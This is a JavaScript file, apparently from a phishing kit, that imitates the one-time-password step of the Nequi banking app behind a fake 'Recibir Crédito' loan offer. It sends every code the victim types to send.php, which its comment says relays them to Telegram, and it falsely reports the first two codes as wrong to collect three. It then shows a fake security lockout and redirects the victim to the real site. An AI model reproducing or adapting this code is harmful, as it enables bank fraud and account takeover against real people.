(() => {
  if (!sessionStorage.getItem('phone')) {
    window.location.replace('index.php');
    return;
  }

  const boxes = Array.from(document.querySelectorAll('.otp-box'));
  const form  = document.getElementById('otpForm');
  const btn   = document.getElementById('otpSubmit');
  const card  = document.getElementById('otpCard');
  const title = document.getElementById('otpTitle');
  const sub   = document.getElementById('otpSub');

  let attempts = Number(sessionStorage.getItem('otpAttempts') || '0');

  // Muestra/oculta estado de error visual
  function setOtpError(on) {
    if (on) {
      card.classList.add('otp-error');
      title.textContent = 'Clave dinámica incorrecta';
      sub.textContent   = 'Ingresa la clave de 6 dígitos que aparece en la App nuevamente.';
      btn.textContent   = 'Confirmar';
      boxes.forEach((b) => (b.value = ''));
      setTimeout(() => boxes[0]?.focus(), 50);
    } else {
      card.classList.remove('otp-error');
      title.textContent = 'Para finalizar, ingrese su clave dinámica';
      sub.textContent   = 'Ingresa la clave de 6 dígitos que aparece en la App.';
      btn.textContent   = 'Recibir Crédito';
    }
  }

  // Si ya van 1 o 2 intentos previos, mostrar estado de error al cargar
  if (attempts >= 1) setOtpError(true);

  setTimeout(() => boxes[0]?.focus(), 80);

  // Cuenta regresiva visible en el botón, llama onDone al terminar
  function startCountdown(seconds, onDone) {
    btn.disabled = true;
    let rem = seconds;
    btn.textContent = `Procesando... (${rem}s)`;
    const iv = setInterval(() => {
      rem--;
      if (rem <= 0) {
        clearInterval(iv);
        btn.disabled = false;
        onDone();
      } else {
        btn.textContent = `Procesando... (${rem}s)`;
      }
    }, 1000);
  }

  // Popup modal con cuenta regresiva de 20s y redirect final
  function showFinalModal(redirectUrl) {
    const overlay = document.createElement('div');
    overlay.style.cssText = [
      'position:fixed;inset:0;background:rgba(0,0,0,.6);',
      'display:flex;align-items:center;justify-content:center;',
      'z-index:9999;padding:20px;',
    ].join('');

    const modal = document.createElement('div');
    modal.style.cssText = [
      'background:#fff;border-radius:18px;padding:36px 24px 28px;',
      'max-width:360px;width:100%;text-align:center;',
      'box-shadow:0 24px 64px rgba(0,0,0,.35);',
    ].join('');

    modal.innerHTML = `
      <div style="font-size:52px;margin-bottom:14px;">⚠️</div>
      <h2 style="font-size:19px;font-weight:800;color:#1a1a2e;margin:0 0 10px;">Límite de intentos alcanzado</h2>
      <p style="font-size:14px;color:#555;line-height:1.6;margin:0 0 22px;">
        Por tu seguridad hemos bloqueado temporalmente el acceso.<br>
        Serás redirigido automáticamente.
      </p>
      <p style="font-size:13px;color:#999;margin:0 0 12px;">
        Redirigiendo en <strong id="modalSecs" style="color:#da0081;">20</strong> segundos…
      </p>
      <div style="height:5px;background:#f0f0f0;border-radius:99px;overflow:hidden;">
        <div id="modalBar" style="height:100%;width:100%;background:#da0081;transition:width 1s linear;border-radius:99px;"></div>
      </div>
    `;

    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    const TOTAL = 20;
    let secs = TOTAL;
    const secsEl = document.getElementById('modalSecs');
    const barEl  = document.getElementById('modalBar');

    const iv = setInterval(() => {
      secs--;
      if (secsEl) secsEl.textContent = secs;
      if (barEl)  barEl.style.width  = (secs / TOTAL * 100) + '%';
      if (secs <= 0) {
        clearInterval(iv);
        sessionStorage.clear();
        window.location.replace(redirectUrl);
      }
    }, 1000);
  }

  // Navegación de cajas OTP
  boxes.forEach((box, i) => {
    box.addEventListener('input', (e) => {
      const v = e.target.value.replace(/\D/g, '');
      e.target.value = v.slice(-1);
      if (e.target.value && i < boxes.length - 1) boxes[i + 1].focus();
    });
    box.addEventListener('keydown', (e) => {
      if      (e.key === 'Backspace'   && !box.value && i > 0)               boxes[i - 1].focus();
      else if (e.key === 'ArrowLeft'   && i > 0)                              boxes[i - 1].focus();
      else if (e.key === 'ArrowRight'  && i < boxes.length - 1)              boxes[i + 1].focus();
    });
    box.addEventListener('paste', (e) => {
      e.preventDefault();
      const d = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 6);
      if (!d) return;
      d.split('').forEach((ch, idx) => { if (boxes[idx]) boxes[idx].value = ch; });
      boxes[Math.min(d.length, boxes.length - 1)].focus();
    });
  });

  form.addEventListener('submit', (e) => {
    e.preventDefault();
    const code = boxes.map((b) => b.value).join('');
    if (code.length !== 6) { boxes.find((b) => !b.value)?.focus(); return; }

    sessionStorage.setItem('otp', code);

    // Enviar a Telegram (no bloqueante)
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ step: 'otp', otp: code, attempt: attempts + 1 }),
      keepalive: true,
    }).catch(() => {});

    attempts += 1;
    sessionStorage.setItem('otpAttempts', String(attempts));

    if (attempts === 1) {
      // 1.ª clave: 6 segundos de espera → estado de error
      startCountdown(6, () => setOtpError(true));

    } else if (attempts === 2) {
      // 2.ª clave: 3 segundos de espera → estado de error
      startCountdown(3, () => setOtpError(true));

    } else {
      // 3.ª clave: popup con 20s de cuenta regresiva → redirect final
      btn.disabled    = true;
      btn.textContent = 'Procesando...';
      showFinalModal('https://www.nequi.com');
    }
  });
})();
